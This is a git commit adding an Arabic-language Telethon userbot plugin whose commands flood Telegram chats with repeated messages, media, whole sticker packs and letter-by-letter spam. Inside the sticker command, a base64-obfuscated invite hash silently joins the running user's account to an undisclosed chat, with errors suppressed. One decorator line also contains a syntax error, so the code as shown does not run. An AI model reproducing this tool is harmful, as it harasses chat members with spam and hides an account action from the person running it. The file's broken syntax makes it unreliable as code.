d4cc7b0cda6260dead7558a3580c64f5327a2d05
Muhammad <101535131+jmthonar@users.noreply.github.com>
2022-04-16 11:24:00 +0300

    Create التكرار.py

---
+++ userbot/plugins/التكرار.py
@@ -0,0 +1,272 @@
+import asyncio
+import base64
+
+from telethon.tl import functions, types
+from telethon.tl.functions.messages import GetStickerSetRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from telethon.utils import get_display_name
+
+from userbot import jmthon
+
+from ..core.managers import edit_delete, edit_or_reply
+from ..helpers.tools import media_type
+from ..helpers.utils import _jmthonutils
+from ..sql_helper.globals import addgvar, gvarstatus
+from . import BOTLOG, BOTLOG_CHATID
+
+
+
+async def spam_function(event, RR7PP, jmthon, sleeptimem, sleeptimet, DelaySpam=False):
+
+    counter = int(jmthon[0])
+    if len(jmthon) == 2:
+        spam_message = str(jmthon[1])
+        for _ in range(counter):
+            if gvarstatus("spamwork") is None:
+                return
+            if event.reply_to_msg_id:
+                await RR7PP.reply(spam_message)
+            else:
+                await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
+    elif event.reply_to_msg_id and RR7PP.media:
+        for _ in range(counter):
+            if gvarstatus("spamwork") is None:
+                return
+            RR7PP = await event.client.send_file(
+                event.chat_id, RR7PP, caption=RR7PP.text
+            )
+            await _jmthonutils.unsavegif(event, RR7PP)
+            await asyncio.sleep(sleeptimem)
+        if BOTLOG:
+            if DelaySpam is not True:
+                if event.is_private:
+                    await event.client.send_message(
+                        BOTLOG_CHATID,
+                        "**⌔∮ التڪرار  **\n"
+                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه**",
+                    )
+                else:
+                    await event.client.send_message(
+                        BOTLOG_CHATID,
+                        "**⌔∮ التڪرار  **\n"
+                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه**",
+                    )
+            elif event.is_private:
+                await event.client.send_message(
+                    BOTLOG_CHATID,
+                    "**⌔∮ التكرار الوقتي **\n"
+                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
+                )
+            else:
+                await event.client.send_message(
+                    BOTLOG_CHATID,
+                    "**⌔∮ التكرار الوقتي **\n"
+                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
+                )
+
+            RR7PP = await event.client.send_file(BOTLOG_CHATID, RR7PP)
+            await _jmthonutils.unsavegif(event, RR7PP)
+        return
+    elif event.reply_to_msg_id and RR7PP.text:
+        spam_message = RR7PP.text
+        for _ in range(counter):
+            if gvarstatus("spamwork") is None:
+                return
+            await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
+    else:
+        return
+    if DelaySpam is not True:
+        if BOTLOG:
+            if event.is_private:
+                await event.client.send_message(
+                    BOTLOG_CHATID,
+                    "**⌔∮ التڪرار  **\n"
+                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **رسائل ال   :** \n"
+                    + f"⌔∮ `{spam_message}`",
+                )
+            else:
+                await event.client.send_message(
+                    BOTLOG_CHATID,
+                    "**⌔∮ التڪرار  **\n"
+                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {counter} **رسائل الـ   :** \n"
+                    + f"⌔∮ `{spam_message}`",
+                )
+    elif BOTLOG:
+        if event.is_private:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ التكرار الوقتي **\n"
+                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {sleeptimet} seconds and with {counter} **رسائل الـ   :** \n"
+                + f"⌔∮ `{spam_message}`",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ التكرار الوقتي **\n"
+                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {sleeptimet} **الثواني و مع** {counter} **رسائل الـ  ️ :** \n"
+                + f"⌔∮ `{spam_message}`",
+            )
+
+
+@jmthon.ar_cmd(
+    pattern="كرر (.*)")
+async def spammer(event):
+    RR7PP = await event.get_reply_message()
+    jmthon = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
+    try:
+        counter = int(jmthon[0])
+    except Exception:
+        return await edit_delete(
+            event, "⌔∮ يجي استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
+        )
+    if counter > 50:
+        sleeptimet = 0.5
+        sleeptimem = 1
+    else:
+        sleeptimet = 0.1
+        sleeptimem = 0.3
+    await event.delete()
+    addgvar("spamwork", True)
+    await spam_function(event, RR7PP, jmthon, sleeptimem, sleeptimet)
+
+
+@jmthon.ar_cmd(
+    pattern="مكرر (.*)"
+)
+async def spammer(event):
+    reply = await event.get_reply_message()
+    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
+    try:
+        sleeptimet = sleeptimem = float(input_str[0])
+    except Exception:
+        return await edit_delete(
+            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
+        )
+    jmthon = input_str[1:]
+    await event.delete()
+    addgvar("spamwork", True)
+    await spam_function(event, reply, jmthon, sleeptimem, sleeptimet, DelaySpam=True)
+
+
+@jmthon.ar_cmd(
+    pattern="تكرار الملصق"$
+)
+async def stickerpack_spam(event):
+    reply = await event.get_reply_message()
+    if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
+        return await edit_delete(
+            event, "**⌔∮ قم بالردّ على أيّ ملصق لإرسال جميع ملصقات الحزمة  **"
+        )
+    hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
+    try:
+        stickerset_attr = reply.document.attributes[1]
+        jmthonevent = await edit_or_reply(
+            event, "**⌔∮ جاري إحضار تفاصيل حزمة الملصقات، يرجى الإنتظار قليلا  ⏱**"
+        )
+    except BaseException:
+        await edit_delete(
+            event,
+            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
+            5,
+        )
+        return
+    try:
+        get_stickerset = await event.client(
+            GetStickerSetRequest(
+                types.InputStickerSetID(
+                    id=stickerset_attr.stickerset.id,
+                    access_hash=stickerset_attr.stickerset.access_hash,
+                )
+            )
+        )
+    except Exception:
+        return await edit_delete(
+            jmthonevent,
+            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
+        )
+    try:
+        hmm = Get(hmm)
+        await event.client(hmm)
+    except BaseException:
+        pass
+    reqd_sticker_set = await event.client(
+        functions.messages.GetStickerSetRequest(
+            stickerset=types.InputStickerSetShortName(
+                short_name=f"{get_stickerset.set.short_name}"
+            )
+        )
+    )
+    addgvar("spamwork", True)
+    for m in reqd_sticker_set.documents:
+        if gvarstatus("spamwork") is None:
+            return
+        await event.client.send_file(event.chat_id, m)
+        await asyncio.sleep(0.7)
+    if BOTLOG:
+        if event.is_private:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار الملصق :**\n"
+                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في  :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع الحزمة **",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار الملصق :**\n"
+                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع الحزمة **",
+            )
+        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])
+
+
+@jmthon.ar_cmd(
+    pattern="سبام (.*)")
+async def tmeme(event):
+    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
+    message = cspam.replace(" ", "")
+    await event.delete()
+    addgvar("spamwork", True)
+    for letter in message:
+        if gvarstatus("spamwork") is None:
+            return
+        await event.respond(letter)
+    if BOTLOG:
+        if event.is_private:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار بالحرف 📝 :**\n"
+                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** [User](tg://user?id={event.chat_id}) **الدردشة مع** : `{message}`",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار بالحرف 📝 :**\n"
+                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** : `{message}`",
+            )
+
+
+@jmthon.ar_cmd(
+    pattern="وسبام (.*)")
+async def tmeme(event):
+    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
+    message = wspam.split()
+    await event.delete()
+    addgvar("spamwork", True)
+    for word in message:
+        if gvarstatus("spamwork") is None:
+            return
+        await event.respond(word)
+    if BOTLOG:
+        if event.is_private:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار بالكلمه : **\n"
+                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع :** `{message}`",
+            )
+        else:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                "**⌔∮ تكرار بالكلمه : **\n"
+                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع :** `{message}`",
+            )
